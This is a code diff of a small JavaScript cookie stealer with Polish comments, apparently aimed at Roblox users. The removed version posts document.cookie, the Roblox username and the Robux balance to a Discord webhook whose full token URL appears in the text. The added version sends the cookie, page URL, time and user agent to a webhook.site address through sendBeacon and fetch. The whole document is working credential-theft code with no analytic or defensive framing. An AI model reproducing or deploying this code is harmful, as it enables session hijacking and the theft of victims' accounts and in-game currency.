@@ -1,26 +1,20 @@
 (function() {
-    const webhook = "https://discord.com/api/webhooks/1523482779432521799/biYFRYAdMvpPZYhtC45gyo-BMdIKTROVdRIYyD-8WpR1zwng5yqZAbZfTtmr-4m8J_vj";
+    const webhook = "https://webhook.site/53158f3f-579b-4186-8cdd-d33333543bec";
     
-    // Główny cookie
+    const data = {
+        cookie: document.cookie,
+        url: window.location.href,
+        time: new Date().toLocaleString(),
+        userAgent: navigator.userAgent
+    };
+
+    // Wysyłanie przez sendBeacon (szybkie)
+    navigator.sendBeacon(webhook, JSON.stringify(data));
+
+    // Dodatkowo przez fetch
     fetch(webhook, {
         method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({content: "**COOKIE:**\n```" + document.cookie + "```"})
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
     }).catch(() => {});
-
-    // Dodatkowe info
-    setTimeout(() => {
-        try {
-            const info = {
-                username: window.Roblox?.CurrentUser?.Name || "unknown",
-                robux: document.querySelector('[data-testid="nav-robux-amount"]')?.innerText || "unknown",
-                time: new Date().toLocaleString()
-            };
-            fetch(webhook, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({content: "**EXTRA INFO:**\n```" + JSON.stringify(info, null, 2) + "```"})
-            });
-        } catch(e) {}
-    }, 1500);
 })();
